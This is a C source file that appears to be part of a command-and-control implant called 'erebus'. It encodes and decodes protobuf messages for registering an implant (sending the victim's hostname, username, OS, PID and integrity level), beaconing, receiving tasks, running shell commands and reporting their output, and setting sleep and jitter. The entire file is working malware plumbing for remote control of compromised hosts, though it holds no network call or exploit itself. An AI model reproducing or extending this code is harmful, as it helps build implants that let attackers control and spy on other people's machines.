#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/pb_wire.h"

static int encode_task_result_msg(const erebus_task_result *r, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 512)) return 0;
    erebus_pb_write_string(&w, 1, r->task_id);
    erebus_pb_write_bool(&w, 2, r->success);
    if (r->data && r->data_len)
        erebus_pb_write_bytes(&w, 3, r->data, r->data_len);
    if (r->error[0])
        erebus_pb_write_string(&w, 4, r->error);
    if (r->execution_time_ms)
        erebus_pb_write_int64(&w, 5, r->execution_time_ms);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_register(const erebus_register_msg *m, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 512)) return 0;
    erebus_pb_write_string(&w, 1, m->implant_id);
    erebus_pb_write_string(&w, 2, m->hostname);
    erebus_pb_write_string(&w, 3, m->username);
    erebus_pb_write_string(&w, 4, m->os);
    erebus_pb_write_string(&w, 5, m->arch);
    erebus_pb_write_uint32(&w, 6, m->pid);
    erebus_pb_write_string(&w, 7, m->integrity_level);
    erebus_pb_write_int64(&w, 8, m->timestamp);
    if (m->hmac_len)
        erebus_pb_write_bytes(&w, 9, m->hmac, m->hmac_len);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_decode_register_resp(const uint8_t *in, size_t in_len, erebus_register_resp *m) {
    memset(m, 0, sizeof(*m));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        uint64_t v;
        switch (field) {
        case 1:
            erebus_pb_read_varint(&r, &v);
            m->success = (int)v;
            break;
        case 2:
            if (erebus_pb_read_bytes(&r, &b, &n)) erebus_pb_copy_bytes(m->session_id, sizeof(m->session_id), b, n);
            break;
        case 3:
            erebus_pb_read_varint(&r, &v);
            m->next_checkin_ms = (int64_t)v;
            break;
        case 4:
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                m->encrypted_session_key = (uint8_t *)malloc(n);
                if (!m->encrypted_session_key) return 0;
                memcpy(m->encrypted_session_key, b, n);
                m->encrypted_session_key_len = n;
            }
            break;
        default:
            if (!erebus_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

void erebus_pb_free_register_resp(erebus_register_resp *m) {
    free(m->encrypted_session_key);
    m->encrypted_session_key = NULL;
    m->encrypted_session_key_len = 0;
}

int erebus_pb_encode_beacon(const erebus_beacon_msg *m, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 1024)) return 0;
    erebus_pb_write_string(&w, 1, m->implant_id);
    erebus_pb_write_string(&w, 2, m->session_id);
    erebus_pb_write_int64(&w, 3, m->timestamp);
    if (m->hmac_len)
        erebus_pb_write_bytes(&w, 4, m->hmac, m->hmac_len);
    if (m->encrypted_results_len)
        erebus_pb_write_bytes(&w, 6, m->encrypted_results, m->encrypted_results_len);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int decode_task_msg(const uint8_t *in, size_t in_len, erebus_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        uint64_t v;
        switch (field) {
        case 1:
            if (erebus_pb_read_bytes(&r, &b, &n)) erebus_pb_copy_bytes(t->task_id, sizeof(t->task_id), b, n);
            break;
        case 2:
            if (erebus_pb_read_bytes(&r, &b, &n)) erebus_pb_copy_bytes(t->implant_id, sizeof(t->implant_id), b, n);
            break;
        case 3:
            erebus_pb_read_varint(&r, &v);
            t->task_type = (int32_t)v;
            break;
        case 4:
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                if (n > EREBUS_MAX_TASK_DATA_LEN) return 0;
                t->data = (uint8_t *)malloc(n ? n : 1);
                if (!t->data) return 0;
                if (n) memcpy(t->data, b, n);
                t->data_len = n;
            }
            break;
        case 5:
            erebus_pb_read_varint(&r, &v);
            t->timeout_ms = (int64_t)v;
            break;
        default:
            if (!erebus_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

int erebus_pb_decode_beacon_resp(const uint8_t *in, size_t in_len, erebus_beacon_resp *m) {
    memset(m, 0, sizeof(*m));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    size_t cap = 0;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        uint64_t v;
        switch (field) {
        case 1:
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                if (m->task_count >= EREBUS_MAX_BEACON_TASKS) return 0;
                if (m->task_count >= cap) {
                    cap = cap ? cap * 2 : 4;
                    if (cap > EREBUS_MAX_BEACON_TASKS) cap = EREBUS_MAX_BEACON_TASKS;
                    erebus_task *p = (erebus_task *)realloc(m->tasks, cap * sizeof(erebus_task));
                    if (!p) return 0;
                    m->tasks = p;
                }
                if (!decode_task_msg(b, n, &m->tasks[m->task_count])) return 0;
                m->task_count++;
            }
            break;
        case 2:
            erebus_pb_read_varint(&r, &v);
            m->next_checkin_ms = (int64_t)v;
            break;
        case 3:
            erebus_pb_read_varint(&r, &v);
            m->terminate = (int)v;
            break;
        case 4:
            if (erebus_pb_read_bytes(&r, &b, &n)) {
                if (n > EREBUS_MAX_ENCRYPTED_TASKS) return 0;
                m->encrypted_tasks = (uint8_t *)malloc(n ? n : 1);
                if (!m->encrypted_tasks) return 0;
                if (n) memcpy(m->encrypted_tasks, b, n);
                m->encrypted_tasks_len = n;
            }
            break;
        default:
            if (!erebus_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

void erebus_pb_free_beacon_resp(erebus_beacon_resp *m) {
    erebus_pb_free_tasks(m->tasks, m->task_count);
    m->tasks = NULL;
    m->task_count = 0;
    free(m->encrypted_tasks);
    m->encrypted_tasks = NULL;
    m->encrypted_tasks_len = 0;
}

int erebus_pb_encode_results_payload(erebus_task_result *results, size_t count, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 1024)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_task_result_msg(&results[i], &sub, &sub_len)) {
            erebus_pb_writer_free(&w);
            return 0;
        }
        erebus_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_decode_tasks_payload(const uint8_t *in, size_t in_len, erebus_task **tasks, size_t *count) {
    *tasks = NULL;
    *count = 0;
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    size_t cap = 0;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        if (field != 1 || wire != 2) {
            if (!erebus_pb_skip(&r, wire)) return 0;
            continue;
        }
        if (!erebus_pb_read_bytes(&r, &b, &n)) return 0;
        if (*count >= EREBUS_MAX_BEACON_TASKS) return 0;
        if (*count >= cap) {
            cap = cap ? cap * 2 : 4;
            if (cap > EREBUS_MAX_BEACON_TASKS) cap = EREBUS_MAX_BEACON_TASKS;
            erebus_task *p = (erebus_task *)realloc(*tasks, cap * sizeof(erebus_task));
            if (!p) return 0;
            *tasks = p;
        }
        if (!decode_task_msg(b, n, &(*tasks)[*count])) return 0;
        (*count)++;
    }
    return 1;
}

void erebus_pb_free_tasks(erebus_task *tasks, size_t count) {
    if (!tasks) return;
    for (size_t i = 0; i < count; i++)
        free(tasks[i].data);
    free(tasks);
}

int erebus_pb_decode_shell_task(const uint8_t *in, size_t in_len, erebus_shell_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        if (field == 1 && erebus_pb_read_bytes(&r, &b, &n))
            erebus_pb_copy_bytes(t->command, sizeof(t->command), b, n);
        else if (!erebus_pb_skip(&r, wire))
            return 0;
    }
    return 1;
}

int erebus_pb_encode_shell_result(const char *stdout_s, const char *stderr_s, int32_t exit_code, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 4096)) return 0;
    if (stdout_s) erebus_pb_write_string(&w, 1, stdout_s);
    if (stderr_s) erebus_pb_write_string(&w, 2, stderr_s);
    erebus_pb_write_uint32(&w, 3, (uint32_t)exit_code);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_decode_sleep_task(const uint8_t *in, size_t in_len, erebus_sleep_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        if (field == 1 && erebus_pb_read_varint(&r, &v))
            t->sleep_ms = (int64_t)v;
        else if (field == 2 && erebus_pb_read_varint(&r, &v))
            t->jitter_pct = (int32_t)v;
        else if (!erebus_pb_skip(&r, wire))
            return 0;
    }
    return 1;
}

int erebus_pb_encode_task_result(const erebus_task_result *r, uint8_t **out, size_t *out_len) {
    return encode_task_result_msg(r, out, out_len);
}